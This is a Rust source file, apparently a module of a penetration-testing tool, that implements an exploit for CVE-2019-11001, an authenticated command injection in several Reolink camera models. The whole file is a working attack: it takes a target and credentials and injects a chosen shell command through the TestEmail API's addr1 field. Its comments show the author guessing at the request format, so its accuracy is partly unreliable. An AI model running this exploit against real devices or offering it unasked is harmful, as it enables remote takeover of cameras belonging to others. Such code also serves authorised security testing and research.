use anyhow::{Result, Context};
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target, prompt_default};
use urlencoding::encode;

/// Reolink Camera Authenticated Command Injection (CVE-2019-11001)
/// 
/// Exploits an authenticated OS command injection in the `TestEmail` functionality.
/// Affected Models: RLC-410W, C1 Pro, C2 Pro, RLC-422W, RLC-511W (Firmware <= 1.0.227).
/// 
/// Parameter: `addr1` in `TestEmail` command.

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP")?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    
    // Default HTTP/HTTPS? 
    // Usually HTTP port 80 or HTTPS 443. We will default to HTTP but can try HTTPS if needed.
    // Let's assume HTTP validation (can be simple URL).
    
    let base_url = if target_ip.contains("://") {
        target_ip.clone()
    } else {
        format!("http://{}", target_ip)
    };
    
    println!("{} Target: {}", "[*]".blue(), base_url);
    
    // Credentials required
    let username = prompt_default("Username", "admin")?;
    let password = prompt_required("Password")?;
    let cmd = prompt_default("Command to execute", "id")?;

    println!("{} Sending exploit...", "[*]".blue());
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(15))
        .build()?;

    // Construct payload
    // Command Injection style: test@test.com; <CMD>
    let injection = format!("test@test.com; {}", cmd);
    
    // The API requires specific structure. Based on PoC analysis.
    // Usually sent as GET or POST. The PoC uses a GET with JSON-like structure in URL or POST body?
    // Public docs say: /api.cgi?cmd=TestEmail...
    // But Reolink API often takes a JSON body.
    
    // Let's model after the known exploit path:
    // Some versions accept it in the JSON body of a POST to /api.cgi
    
    let url = format!("{}/api.cgi?cmd=TestEmail&user={}&password={}", base_url.trim_end_matches('/'), encode(&username), encode(&password));

    // The body usually is a JSON array
    let body = format!("[{{ \"cmd\": \"TestEmail\", \"action\": 0, \"param\": {{ \"addr1\": \"{}\", \"addr2\": \"test\", \"addr3\": \"test\", \"interval\": 60 }} }}]", injection);

    // Some variants use GET but typically these APIs are POST with JSON.
    // We will try POST.
    
    let res = client.post(&url)
        .header("Content-Type", "application/json")
        .body(body)
        .send()
        .await
        .context("Failed to send request")?;
        
    let status = res.status();
    let text = res.text().await?;
    
    // If successful, the command output might not be returned (Blind RCE).
    // Or it might be returned in the 'value' or error message?
    // Usually TestEmail triggers the mail binary.
    
    if status.is_success() {
        println!("{} Request sent successfully (HTTP {}).", "[+]".green(), status);
        println!("{} Response: {}", "[*]".blue(), text);
        println!("{} Note: This RCE is often blind. Check your listener or device behavior.", "[*]".yellow());
    } else {
        println!("{} Request failed (HTTP {}). check credentials or target.", "[-]".red(), status);
    }

    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║      Reolink Camera Authenticated RCE (CVE-2019-11001)    ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
